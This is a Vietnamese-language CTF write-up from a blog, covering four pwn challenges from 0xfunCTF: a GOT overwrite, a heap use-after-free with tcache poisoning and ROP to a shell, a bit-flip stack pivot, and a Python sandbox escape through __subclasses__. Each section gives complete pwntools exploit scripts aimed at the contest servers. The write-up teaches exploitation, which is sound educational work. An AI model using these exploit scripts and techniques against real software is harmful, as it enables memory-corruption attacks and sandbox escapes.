+++
title = '0xfunCTF'
date = 2026-02-16T21:45:28+07:00
draft = false
categories = ["ctf"]
tags = ["pwn"]
+++

## What you have?

### 1. Phân tích Binary

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD *v4; // [rsp+8h] [rbp-18h] BYREF
  _QWORD v5[2]; // [rsp+10h] [rbp-10h] BYREF

  v5[1] = __readfsqword(0x28u);
  setbuf(_bss_start, 0);
  puts("Show me what you GOT!");
  __isoc99_scanf("%lu", &v4);
  puts("Show me what you GOT! I want to see what you GOT!");
  __isoc99_scanf("%lu", v5);
  *v4 = v5[0];
  puts("Goodbye!");
  return 0;
}

void __noreturn win()
{
  FILE *stream; // [rsp+8h] [rbp-58h]
  _QWORD ptr[10]; // [rsp+10h] [rbp-50h] BYREF

  ptr[9] = __readfsqword(0x28u);
  stream = fopen("flag.txt", "r");
  memset(ptr, 0, 64);
  if ( !stream )
  {
    perror("Failed to open \"flag.txt\".");
    exit(1);
  }
  fread(ptr, 1u, 0x40u, stream);
  printf("I like what you GOT! Take this: %s.\n", (const char *)ptr);
  exit(0);
}
```

```js
> checksec chall 
[*] '/home/lwd3c/Desktop/CTF/2026/0xFunCTF/whatuhave/chall'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Từ hàm `main`:
```c
_QWORD *v4;
_QWORD v5[2];

scanf("%lu", &v4);
scanf("%lu", v5);
*v4 = v5[0];
```

Chương trình cho phép ghi đè 8 bytes vào 1 địa chỉ bất kì, và từ output của đề bài thì là ghi đè vào địa chỉ GOT của chương trình.


### 2. Khai thác

Tại hàm `win` sẽ thực hiện in nội dung của `flag.txt` ra nên ta sẽ ghi đè giá trị vào địa chỉ GOT nào đó bằng địa chỉ của hàm `win`.

```py
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/lwd3c/Desktop/CTF/2026/0xFunCTF/whatuhave/chall:
GOT protection: No RELRO | Found 11 GOT entries passing the filter
[0x403430] puts@GLIBC_2.2.5 -> 0x7ffff7c87be0 (puts) ◂— endbr64
[0x403438] fread@GLIBC_2.2.5 -> 0x7ffff7c86400 (fread) ◂— endbr64
[0x403440] __stack_chk_fail@GLIBC_2.4 -> 0x7ffff7d37ec0 (__stack_chk_fail) ◂— endbr64
[0x403448] setbuf@GLIBC_2.2.5 -> 0x7ffff7c8f750 (setbuf) ◂— endbr64
[0x403450] printf@GLIBC_2.2.5 -> 0x7ffff7c60100 (printf) ◂— endbr64
[0x403458] fopen@GLIBC_2.2.5 -> 0x7ffff7c85e60 (fopen64) ◂— endbr64
[0x403460] perror@GLIBC_2.2.5 -> 0x7ffff7c28a93 (perror) ◂— endbr64
[0x403468] __isoc99_scanf@GLIBC_2.7 -> 0x7ffff7c5fe10 (__isoc99_scanf) ◂— endbr64
[0x403470] exit@GLIBC_2.2.5 -> 0x7ffff7c47ba0 (exit) ◂— endbr64
[0x403478] __libc_start_main@GLIBC_2.34 -> 0x7ffff7c2a200 (__libc_start_main) ◂— endbr64
[0x403480] __gmon_start__ -> 0
pwndbg> 
```

Ta thấy sau khi ghi đè xong chương trình sẽ gọi tới hàm `puts` nên ta sẽ ghi đè vào `puts@GOT` địa chỉ hàm `win` để khi chương trình gọi `puts` thực chất sẽ là gọi `win`

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('chall', checksec=False)
# libc = ELF('', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+86
        b*main+126
        
    """)

if args.REMOTE:
    p = remote("chall.0xfun.org", int("11506"))
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !
info('GOT address exit: ' + hex(exe.got.exit))
info('win function address: ' + hex(exe.sym.win))

slna('GOT!\n', exe.got.puts)
slna('I want to see what you GOT!\n', exe.sym.win)

p.interactive()
```

`FLAG: 0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}`

---

## 67

### 1. Phân tích Binary

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  init(argc, argv, envp);
  while ( 1 )
  {
    menu();
    v3 = get_int();
    if ( v3 == 5 )
      exit(0);
    if ( v3 > 5 )
    {
LABEL_14:
      puts("Invalid option");
    }
    else
    {
      switch ( v3 )
      {
        case 4:
          edit_note();
          break;
        case 3:
          read_note();
          break;
        case 1:
          create_note();
          break;
        case 2:
          delete_note();
          break;
        default:
          goto LABEL_14;
      }
    }
  }
}

unsigned __int64 create_note()
{
  signed int v1; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 < 0xA )
  {
    printf("Size: ");
    v2 = get_int();
    if ( v2 > 0 && v2 <= 1024 )
    {
      *((_QWORD *)&notes + v1) = malloc(v2);
      sizes[v1] = v2;
      printf("Data: ");
      read(0, *((void **)&notes + v1), v2);
      puts("Note created!");
    }
    else
    {
      puts("Invalid size");
    }
  }
  else
  {
    puts("Invalid index");
  }
  return v3 - __readfsqword(0x28u);
}

unsigned __int64 delete_note()
{
  signed int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 <= 9 && *((_QWORD *)&notes + v1) )
  {
    free(*((void **)&notes + v1));
    puts("Note deleted!");
  }
  else
  {
    puts("Invalid index");
  }
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 read_note()
{
  signed int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 <= 9 && *((_QWORD *)&notes + v1) )
  {
    printf("Data: ");
    write(1, *((const void **)&notes + v1), (int)sizes[v1]);
    puts(&byte_2094);
  }
  else
  {
    puts("Invalid index");
  }
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 edit_note()
{
  signed int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 <= 9 && *((_QWORD *)&notes + v1) )
  {
    printf("New Data: ");
    read(0, *((void **)&notes + v1), (int)sizes[v1]);
    puts("Note updated!");
  }
  else
  {
    puts("Invalid index");
  }
  return v2 - __readfsqword(0x28u);
}
```

```py
> checksec chall 
[*] '/home/lwd3c/Desktop/CTF/2026/0xFunCTF/six-seven-lmao/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Binary có lỗi Use-After-Free trong hàm `delete` (không xóa pointer sau khi free) và cho phép `read` cũng như `edit` chunk đã free.

Do không thể ghi đè GOT hay Hook (Glibc mới), ta phải leak địa chỉ Stack và ghi đè Return Address để thực thi ROP chain.

### 2. Khai thác

#### Leak Heap Base
Để thực hiện Tcache Poisoning trên Glibc mới, ta cần biết Heap Base để tính toán pointer mã hóa (XOR key).

```py
create(0, 0x80, b'A'*8)
delete(0)
read(0)
ru('Data: ')
leak = u64(r(5).ljust(8, b'\x00'))
heap_base = leak << 12
info(f'Heap base: {hex(heap_base)}')
```

#### Leak Libc Base
Tcache hoạt động theo cơ chế LIFO và chỉ chứa tối đa 7 chunks cho mỗi size class. Để leak libc, ta cần ép một chunk rơi vào Unsorted Bin.

```py
create(1, 0x400, b'B'*8)
for i in range(7):
    create(2 + i, 0x400, b'D'*8)

for i in range(7):
    delete(2 + i)

delete(1)
read(1)
r(6)
leak = u64(r(6).ljust(8, b'\x00'))
libc.address = leak - 0x1e7b20
info(f'Libc base: {hex(libc.address)}')
```

Từ Libc Base, tính được địa chỉ hàm `system`, chuỗi `/bin/sh` và đặc biệt là biến `environ`

```py
environ = libc.symbols['environ']
system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))
info('Environ: ' + hex(environ))
info(f'system: {hex(system)}')
info(f'/bin/sh: {hex(binsh)}')
```

#### Leak Stack Address

Biến `environ` trong libc chứa giá trị là địa chỉ của stack nên ta sẽ sử dụng `environ` để leak địa chỉ stack.

```py
edit(0, p64(encode(heap_base + 0x310, environ-0x18)))
create(1, 0x80, b'C'*8)
create(2, 0x80, b'0')
read(2)
r(30)
stack_leak = u64(r(6).ljust(8, b'\x00'))
info(f'Stack leak: {hex(stack_leak)}')
return_addr = stack_leak - 0x150
info(f'Return address: {hex(return_addr)}')
```
#### ROP Chain

Sau khi có địa chỉ Stack, tính toán vị trí của Return Address (RIP) của hàm `create` trên Stack bằng cách dùng GDB.

```py
create(3, 0x100, b'E'*8)
delete(3)
edit(3, p64(encode(heap_base + 0x3a0, return_addr-0x8)))

payload = flat(
    'D'*8,
    pop_rdi,
    binsh,
    ret,
    system
)
create(4, 0x100, 'A')
create(5, 0x100, payload)
```

Khi hàm `create` thực hiện lệnh `ret`, nó sẽ nhảy vào ROP chain của ta thay vì quay về  main -> Shell.

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+33
    """)

if args.REMOTE:
    p = remote("chall.0xfun.org", int("31774"))
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !

def create(idx, size, data):
    slna(b'> ', 1)
    slna(b'Index: ', idx)
    slna(b'Size: ', size)
    sla(b'Data: ', data)

def delete(idx):
    slna(b'> ', 2)
    slna(b'Index: ', idx)

def read(idx):
    slna(b'> ', 3)
    slna(b'Index: ', idx)

def edit(idx, data):
    slna(b'> ', 4)
    slna(b'Index: ', idx)
    sla(b'Data: ', data)

def encode(chunk_addr, target):
    return target ^ (chunk_addr >> 12)

# Leak heap base
create(0, 0x80, b'A'*8)
delete(0)
read(0)
ru('Data: ')
leak = u64(r(5).ljust(8, b'\x00'))
heap_base = leak << 12

# Leak libc base
create(1, 0x400, b'B'*8)
for i in range(7):
    create(2 + i, 0x400, b'D'*8)

for i in range(7):
    delete(2 + i)

delete(1)
read(1)
r(6)
leak = u64(r(6).ljust(8, b'\x00'))
libc.address = leak - 0x1e7b20
info(f'Libc base: {hex(libc.address)}')
info(f'Heap base: {hex(heap_base)}')
environ = libc.symbols['environ']
info('Environ: ' + hex(environ))
system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))
info(f'system: {hex(system)}')
info(f'/bin/sh: {hex(binsh)}')
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
info(f'pop rdi; ret gadget: {hex(pop_rdi)}')
info(f'ret gadget: {hex(ret)}')

# Leak stack address
edit(0, p64(encode(heap_base + 0x310, environ-0x18)))
create(1, 0x80, b'C'*8)
create(2, 0x80, b'0')
read(2)
r(30)
stack_leak = u64(r(6).ljust(8, b'\x00'))
info(f'Stack leak: {hex(stack_leak)}')
return_addr = stack_leak - 0x150
info(f'Return address: {hex(return_addr)}')

# Overwrite return address
create(3, 0x100, b'E'*8)
delete(3)
edit(3, p64(encode(heap_base + 0x3a0, return_addr-0x8)))

payload = flat(
    'D'*8,
    pop_rdi,
    binsh,
    ret,
    system
)
create(4, 0x100, 'A')
create(5, 0x100, payload)

sl('ls')
sl('cat flag.txt')

p.interactive()
```

`FLAG: 0xfun{p4cm4n_Syu_br0k3_my_xpl0it_btW}`

---

## Bit Flips

### 1. Phân tích Binary

```py
> checksec main_patched 
[*] '/home/lwd3c/Desktop/CTF/2026/0xFunCTF/bitflips_files/main_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
```

Chương trình cho phép chúng ta thực hiện đổi bit (bit flip) tại một địa chỉ bất kỳ, nhưng có giới hạn số lần thực hiện.

```c
// Pseudo-code hàm vuln()
void vuln() {
    // ... Leaks ...
    printf("&main = %p\n", main);
    printf("&system = %p\n", &system);
    printf("&address = %p\n", &v3); // Stack leak
    printf("sbrk(NULL) = %p\n", sbrk(0)); // Heap leak

    // Vòng lặp chính
    for (int i = 0; i <= 2; ++i) {
        bit_flip(); // Cho phép nhập địa chỉ và vị trí bit để XOR
    }
}
```

Chúng ta có đầy đủ leak: Libc base, Code base, Stack, và Heap.
Tuy nhiên, vòng lặp chỉ chạy 3 lần. Với 3 lần flip, rất khó để ghi đè Saved RIP thành một ROP chain hoàn chỉnh (cần thay đổi nhiều byte).

=> Cần tìm cách tăng số lần flip để có thể ghi đè tùy ý.

### 2. Khai thác

#### Infinite Loop

Tấn công biến đếm `i` để có vô hạn lượt flip bằng Integer Overflow.
Biến `i` là kiểu `int` (signed 32-bit), nằm tại `rbp - 0x14`. Điều kiện vòng lặp là `i <= 2`.

Trong bộ nhớ, `i = 0` được biểu diễn là `00 00 00 00`. Nếu ta lật Sign Bit (bit dấu - bit cao nhất của byte cao nhất), giá trị sẽ trở thành số âm cực nhỏ. 
* Địa chỉ: `&i + 3` (Byte cao nhất).
* Bit: `7` (Bit dấu).
* Kết quả: `0` (0x00000000) -> `-2147483648` (0x80000000). 

Khi `i` là số âm, điều kiện `i <= 2` luôn đúng -> Vòng lặp vô hạn.

```py
i_addr_sign_byte = (v3_addr - 4) + 3 

log.info("--> STEP 1: Flipping Sign Bit of 'i' to make it negative...")
p.recvuntil(b'> ')
p.sendline(hex(i_addr_sign_byte).encode())
p.sendline(b'7') 
```

#### ROP Chain

Vì Stack chứa nhiều giá trị rác khó đoán (khó tính toán để Flip bit chính xác), ta chọn Heap làm nơi chứa ROP Chain.

```py
target_heap_addr = heap_base + 0x1000

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))

chain = [
    pop_rdi,
    bin_sh,
    libc.sym['system']
]

log.info(f"Writing ROP Chain to {hex(target_heap_addr)}...")

current_ptr = target_heap_addr
for val in chain:
    diff = val 
    for byte_idx in range(8):
        byte_val = (diff >> (8 * byte_idx)) & 0xFF
        if byte_val == 0: continue
        for bit_idx in range(8):
            if (byte_val >> bit_idx) & 1:
                p.recvuntil(b'> ')
                p.sendline(hex(current_ptr + byte_idx).encode())
                p.sendline(str(bit_idx).encode())
    current_ptr += 8
```

#### Stack Pivot

Để chạy ROP chain trên Heap, ta cần lừa chương trình chuyển RSP về đó bằng gadget `leave; ret`.

Ta cần thực hiện 2 thao tác ghi đè trên Stack hiện tại:

```py
# Sửa Saved RBP: Ghi đè thành Target_Heap_Address - 8
target_rbp_val = target_heap_addr - 8
rbp_loc = v3_addr + 0x10
current_rbp_val = v3_addr + 0x20

log.info(f"Pivoting RBP to {hex(target_rbp_val)}")
diff_rbp = current_rbp_val ^ target_rbp_val

for byte_idx in range(8):
    byte_diff = (diff_rbp >> (8 * byte_idx)) & 0xFF
    if byte_diff == 0: continue
    for bit_idx in range(8):
        if (byte_diff >> bit_idx) & 1:
            p.recvuntil(b'> ')
            p.sendline(hex(rbp_loc + byte_idx).encode())
            p.sendline(str(bit_idx).encode())
```

```py
# Sửa Saved RIP (v3+0x18) thành `leave; ret`
leave_ret = exe.sym['vuln'] + 212 
rip_loc = v3_addr + 0x18
current_rip_val = main_addr + 29

log.info(f"Overwriting RIP to LEAVE; RET: {hex(leave_ret)}")
diff_rip = current_rip_val ^ leave_ret

for byte_idx in range(8):
    byte_diff = (diff_rip >> (8 * byte_idx)) & 0xFF
    if byte_diff == 0: continue
    for bit_idx in range(8):
        if (byte_diff >> bit_idx) & 1:
            p.recvuntil(b'> ')
            p.sendline(hex(rip_loc + byte_idx).encode())
            p.sendline(str(bit_idx).encode())
```

#### Trigger Shell

Lật lại Sign Bit của `i` một lần nữa -> `i` trở thành số dương lớn.

Điều kiện `i <= 2` sai -> Thoát vòng lặp -> Hàm `vuln` return -> Kích hoạt `leave; ret` -> `Shell`!

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('main', checksec=False)
libc = exe.libc

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*vuln+171
        b*bit_flip+106
        
    """)

# p = remote("chall.0xfun.org", int("60638"))
if args.REMOTE:
    p = remote("chall.0xfun.org", int("60638"))
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !

p.recvuntil(b'&main = ')
main_addr = int(p.recvline(), 16)
p.recvuntil(b'&system = ')
system_addr = int(p.recvline(), 16)
p.recvuntil(b'&address = ')
v3_addr = int(p.recvline(), 16)
p.recvuntil(b'sbrk(NULL) = ')
sbrk_leak = int(p.recvline(), 16)

exe.address = main_addr - exe.sym['main']
libc.address = system_addr - libc.sym['system']
heap_base = sbrk_leak - 0x21000 

log.success(f"Libc Base: {hex(libc.address)}")
log.success(f"Heap Base: {hex(heap_base)}")
log.success(f"Stack v3:  {hex(v3_addr)}")

# =============================================================================
# STEP 1: KÍCH HOẠT INFINITE LOOP
# =============================================================================

i_addr_sign_byte = (v3_addr - 4) + 3 

log.info("--> STEP 1: Flipping Sign Bit of 'i' to make it negative...")
p.recvuntil(b'> ')
p.sendline(hex(i_addr_sign_byte).encode())
p.sendline(b'7') 

# =============================================================================
# STEP 2: GHI ROP CHAIN VÀO HEAP
# =============================================================================

target_heap_addr = heap_base + 0x1000

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))

chain = [
    pop_rdi,
    bin_sh,
    libc.sym['system']
]

log.info(f"Writing ROP Chain to {hex(target_heap_addr)}...")

current_ptr = target_heap_addr
for val in chain:
    diff = val 
    for byte_idx in range(8):
        byte_val = (diff >> (8 * byte_idx)) & 0xFF
        if byte_val == 0: continue
        for bit_idx in range(8):
            if (byte_val >> bit_idx) & 1:
                p.recvuntil(b'> ')
                p.sendline(hex(current_ptr + byte_idx).encode())
                p.sendline(str(bit_idx).encode())
    current_ptr += 8

info('pop rdi; ret gadget: ' + hex(pop_rdi))
info('ret gadget: ' + hex(ret_gadget))
info('/bin/sh string: ' + hex(bin_sh))
info('system() address: ' + hex(libc.sym['system']))

# =============================================================================
# STEP 3: STACK PIVOT
# =============================================================================
target_rbp_val = target_heap_addr - 8
rbp_loc = v3_addr + 0x10
current_rbp_val = v3_addr + 0x20

log.info(f"Pivoting RBP to {hex(target_rbp_val)}")
diff_rbp = current_rbp_val ^ target_rbp_val

for byte_idx in range(8):
    byte_diff = (diff_rbp >> (8 * byte_idx)) & 0xFF
    if byte_diff == 0: continue
    for bit_idx in range(8):
        if (byte_diff >> bit_idx) & 1:
            p.recvuntil(b'> ')
            p.sendline(hex(rbp_loc + byte_idx).encode())
            p.sendline(str(bit_idx).encode())

# B. Sửa Saved RIP (v3+0x18) thành `leave; ret`
leave_ret = exe.sym['vuln'] + 212 
rip_loc = v3_addr + 0x18
current_rip_val = main_addr + 29

log.info(f"Overwriting RIP to LEAVE; RET: {hex(leave_ret)}")
diff_rip = current_rip_val ^ leave_ret

for byte_idx in range(8):
    byte_diff = (diff_rip >> (8 * byte_idx)) & 0xFF
    if byte_diff == 0: continue
    for bit_idx in range(8):
        if (byte_diff >> bit_idx) & 1:
            p.recvuntil(b'> ')
            p.sendline(hex(rip_loc + byte_idx).encode())
            p.sendline(str(bit_idx).encode())


# =============================================================================
# STEP 4: BREAK LOOP
# =============================================================================

log.success("--> STEP 4: Breaking loop to trigger Shell...")
p.recvuntil(b'> ')
p.sendline(hex(i_addr_sign_byte).encode())
p.sendline(b'7')

sl('ls')
sl('cat flag')

p.interactive()
```

`FLAG: Quên không lưu hehe :v`

---

## Warden

### 1. Phân tích Sandbox

Service cho phép gửi tối đa 8192 bytes Python code qua stdin:

```py
Enter your Python code (max 8192 bytes).
Terminate with EOF (Ctrl+D).
```

Sau đó server:

* Đọc toàn bộ input bằng `sys.stdin.read()`
* Thực thi code trong môi trường bị sandbox
* Có seccomp filter giám sát syscall

Trong môi trường thực thi:
* `__builtins__` bị loại bỏ
* Không thể dùng trực tiếp:
  * `open`
  * `__import__`
  * `eval`
  * `exec`
  * `os`

Tuy nhiên, object model của Python vẫn tồn tại đầy đủ.

Điểm mấu chốt:

Mọi object trong Python đều có:

```py
obj.__class__
obj.__class__.__base__
obj.__class__.__base__.__subclasses__()
```
Từ đó có thể duyệt toàn bộ class đang tồn tại trong runtime.

### 2. Sandbox Escape

* Lấy root class object
* Gọi `__subclasses__()` để liệt kê tất cả class
* Tìm class có `__init__`.`__globals__`
* Trong globals sẽ có `builtins`
* Recover lại `builtins`

```py
u = "_"*2
c = getattr(1, u+"class"+u)
b = getattr(c, u+"base"+u)
subs = getattr(b, u+"subclasses"+u)()

rb = None
for x in subs:
    try:
        g = getattr(getattr(x, u+"init"+u), u+"globals"+u)
        for k in g:
            if "builtins" in k:
                rb = g[k]
                break
        if rb:
            break
    except:
        pass
```
Sau bước này:
`rb == builtins`

Sau khi recover builtins, chỉ cần:
`print(rb["open"]("/flag.txt").read())`

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('warden', checksec=False)
# libc = ELF('', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        
        
    """)

if args.REMOTE:
    p = remote("chall.0xfun.org", int("23267"))
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !

payload = b"""
u = "_"*2
c = getattr(1, u+"class"+u)
b = getattr(c, u+"base"+u)
subs = getattr(b, u+"subclasses"+u)()

rb = None
for x in subs:
    try:
        g = getattr(getattr(x, u+"init"+u), u+"globals"+u)
        for k in g:
            if "builtins" in k:
                rb = g[k]
                break
        if rb:
            break
    except:
        pass

print(rb["open"]("/flag.txt").read())
"""

ru(b"Terminate with EOF (Ctrl+D).\n\n")
p.send(payload)
p.shutdown('send')   
print(p.recvall().decode())
```

`FLAG: 0xfun{wh0_w4tch3s_th3_w4rd3n_t0ctou_r4c3}`